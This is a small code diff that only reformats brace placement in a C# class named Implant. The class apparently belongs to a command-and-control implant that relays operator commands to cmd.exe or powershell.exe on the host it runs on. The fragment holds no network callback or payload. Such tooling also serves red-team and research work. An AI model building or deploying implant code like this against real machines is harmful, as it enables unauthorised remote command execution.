@@ -40,13 +40,15 @@ public class Implant
         string filename = "";
         string argument = "";
 
-        if (command.Contains("run")) {
+        if (command.Contains("run"))
+        {
             command = command.Remove(0, 4);
             filename = "cmd.exe";
             argument = "/C";
         }
 
-        else if (command.Contains("powershell")) {
+        else if (command.Contains("powershell"))
+        {
             command = command.Remove(0, 11);
             filename = "powershell.exe";
             argument = "";
